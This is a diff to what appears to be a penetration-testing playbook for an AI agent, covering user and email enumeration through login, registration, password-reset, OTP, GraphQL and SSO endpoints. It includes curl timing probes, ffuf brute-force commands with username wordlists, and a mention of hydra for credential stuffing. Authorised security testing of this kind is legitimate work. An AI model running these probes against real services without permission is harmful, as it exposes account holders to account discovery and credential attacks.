@@ -48,14 +48,14 @@ existing and non-existing users is an enumeration vector. This includes:
 
 ## Tools
 
-- `run_tool curl` — HTTP request crafting and timing measurement
-- `run_tool ffuf` — high-volume brute-force enumeration
-- `run_tool hydra` — credential stuffing after confirmed enumeration
+- `curl` — HTTP request crafting and timing measurement
+- `ffuf` — high-volume brute-force enumeration
+- `hydra` — credential stuffing after confirmed enumeration
 - Python/websocket scripts — for WebSocket enumeration
 - `grpcurl` — for gRPC service testing (if available)
 
-For live engagement target requests, use plain `run_tool curl` by default and let the
-current engagement's `auth.json` flow through `rtcurl` automatically. Only add
+For live engagement target requests, use plain `curl` by default and let the
+current auth context through the Kali MCP command-execution tool. Only add
 explicit cookies or authorization headers when intentionally testing a second account,
 session confusion, or auth override behavior.
 
@@ -86,13 +86,13 @@ TMPDIR_ENUM=$(mktemp -d)
 trap 'rm -rf "$TMPDIR_ENUM"' EXIT
 
 # Test with definitely-invalid username
-run_tool curl -s -X POST "http://target/api/login" \
+curl -s -X POST "http://target/api/login" \
   -H "Content-Type: application/json" \
   -d '{"username":"definitely_not_a_user_xyz123","password":"wrong"}' \
   -o "$TMPDIR_ENUM/login_invalid_user.txt" -w "%{http_code}|%{size_download}"
 
 # Test with likely-valid username (admin, test, user, root)
-run_tool curl -s -X POST "http://target/api/login" \
+curl -s -X POST "http://target/api/login" \
   -H "Content-Type: application/json" \
   -d '{"username":"admin","password":"wrong"}' \
   -o "$TMPDIR_ENUM/login_valid_user.txt" -w "%{http_code}|%{size_download}"
@@ -112,13 +112,13 @@ Enumeration indicators:
 
 ```bash
 # Test with fresh email
-run_tool curl -s -X POST "http://target/api/register" \
+curl -s -X POST "http://target/api/register" \
   -H "Content-Type: application/json" \
   -d '{"email":"unique_test_xyz@example.com","password":"Test123!"}' \
   -o "$TMPDIR_ENUM/reg_new.txt" -w "%{http_code}|%{size_download}"
 
 # Test with likely-existing email (use found emails from recon, or admin@target.example)
-run_tool curl -s -X POST "http://target/api/register" \
+curl -s -X POST "http://target/api/register" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@target.example","password":"Test123!"}' \
   -o "$TMPDIR_ENUM/reg_existing.txt" -w "%{http_code}|%{size_download}"
@@ -136,13 +136,13 @@ Enumeration indicators:
 
 ```bash
 # Test with non-existing email
-run_tool curl -s -X POST "http://target/api/forgot-password" \
+curl -s -X POST "http://target/api/forgot-password" \
   -H "Content-Type: application/json" \
   -d '{"email":"nonexistent_xyz123@example.com"}' \
   -o "$TMPDIR_ENUM/reset_invalid.txt" -w "%{http_code}|%{size_download}"
 
 # Test with likely-existing email
-run_tool curl -s -X POST "http://target/api/forgot-password" \
+curl -s -X POST "http://target/api/forgot-password" \
   -H "Content-Type: application/json" \
   -d '{"email":"admin@target.example"}' \
   -o "$TMPDIR_ENUM/reset_valid.txt" -w "%{http_code}|%{size_download}"
@@ -159,7 +159,7 @@ Some apps have dedicated existence-check APIs:
 # Common patterns
 for endpoint in "/api/check-email" "/api/check-username" "/api/users/exists" \
   "/api/check-phone" "/api/validate-email" "/api/account/check"; do
-  code=$(run_tool curl -s -o /dev/null -w "%{http_code}" -X POST "http://target$endpoint" \
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://target$endpoint" \
     -H "Content-Type: application/json" \
     -d '{"email":"test@example.com"}')
   [ "$code" != "404" ] && echo "  $endpoint → $code (exists!)"
@@ -174,7 +174,7 @@ Even when error messages are identical, response time may differ:
 # Measure response time for invalid vs valid user (run 5x each, compare averages)
 echo "=== Invalid user timing ==="
 for i in $(seq 1 5); do
-  run_tool curl -s -X POST "http://target/api/login" \
+  curl -s -X POST "http://target/api/login" \
     -H "Content-Type: application/json" \
     -d '{"username":"nonexistent_xyz","password":"wrong"}' \
     -o /dev/null -w "%{time_total}\n"
@@ -182,7 +182,7 @@ done
 
 echo "=== Valid user timing ==="
 for i in $(seq 1 5); do
-  run_tool curl -s -X POST "http://target/api/login" \
+  curl -s -X POST "http://target/api/login" \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"wrong"}' \
     -o /dev/null -w "%{time_total}\n"
@@ -194,7 +194,7 @@ done
 
 ```bash
 # Username enumeration via ffuf
-run_tool ffuf -u "http://target/api/login" \
+ffuf -u "http://target/api/login" \
   -X POST -H "Content-Type: application/json" \
   -d '{"username":"FUZZ","password":"invalid"}' \
   -w /seclists/Usernames/top-usernames-shortlist.txt \
@@ -202,7 +202,7 @@ run_tool ffuf -u "http://target/api/login" \
   -o /engagement/scans/user_enum.json -of json
 
 # Email enumeration via registration check
-run_tool ffuf -u "http://target/api/register" \
+ffuf -u "http://target/api/register" \
   -X POST -H "Content-Type: application/json" \
   -d '{"email":"FUZZ@target.example","password":"Test123!"}' \
   -w /seclists/Usernames/top-usernames-shortlist.txt \
@@ -210,7 +210,7 @@ run_tool ffuf -u "http://target/api/register" \
   -o /engagement/scans/email_enum.json -of json
 
 # Phone number enumeration (if applicable)
-run_tool ffuf -u "http://target/api/check-phone" \
+ffuf -u "http://target/api/check-phone" \
   -X POST -H "Content-Type: application/json" \
   -d '{"phone":"FUZZ"}' \
   -w /engagement/scans/phone_wordlist.txt \
@@ -222,12 +222,12 @@ run_tool ffuf -u "http://target/api/check-phone" \
 
 ```bash
 # Check if OTP endpoint leaks user existence
-run_tool curl -s -X POST "http://target/api/otp/send" \
+curl -s -X POST "http://target/api/otp/send" \
   -H "Content-Type: application/json" \
   -d '{"phone":"+1234567890"}' \
   -o "$TMPDIR_ENUM/otp_invalid.txt" -w "%{http_code}|%{size_download}"
 
-run_tool curl -s -X POST "http://target/api/otp/send" \
+curl -s -X POST "http://target/api/otp/send" \
   -H "Content-Type: application/json" \
   -d '{"phone":"+10000000000"}' \
   -o "$TMPDIR_ENUM/otp_valid.txt" -w "%{http_code}|%{size_download}"
@@ -258,13 +258,13 @@ ws.close()
 
 ```bash
 # Query with non-existing user
-run_tool curl -s -X POST "http://target/graphql" \
+curl -s -X POST "http://target/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"{ user(email: \"nonexistent@x.com\") { id } }"}' \
   -o "$TMPDIR_ENUM/gql_invalid.txt"
 
 # Query with likely-existing user
-run_tool curl -s -X POST "http://target/graphql" \
+curl -s -X POST "http://target/graphql" \
   -H "Content-Type: application/json" \
   -d '{"query":"{ user(email: \"admin@target.example\") { id } }"}' \
   -o "$TMPDIR_ENUM/gql_valid.txt"
@@ -277,9 +277,9 @@ diff "$TMPDIR_ENUM/gql_invalid.txt" "$TMPDIR_ENUM/gql_valid.txt"
 
 ```bash
 # Some SSO flows redirect differently for valid vs invalid users
-run_tool curl -s -o /dev/null -w "%{redirect_url}" \
+curl -s -o /dev/null -w "%{redirect_url}" \
   "http://target/auth/login?email=nonexistent@x.com"
-run_tool curl -s -o /dev/null -w "%{redirect_url}" \
+curl -s -o /dev/null -w "%{redirect_url}" \
   "http://target/auth/login?email=admin@target.example"
 # Different redirect destination = enumerable
 ```
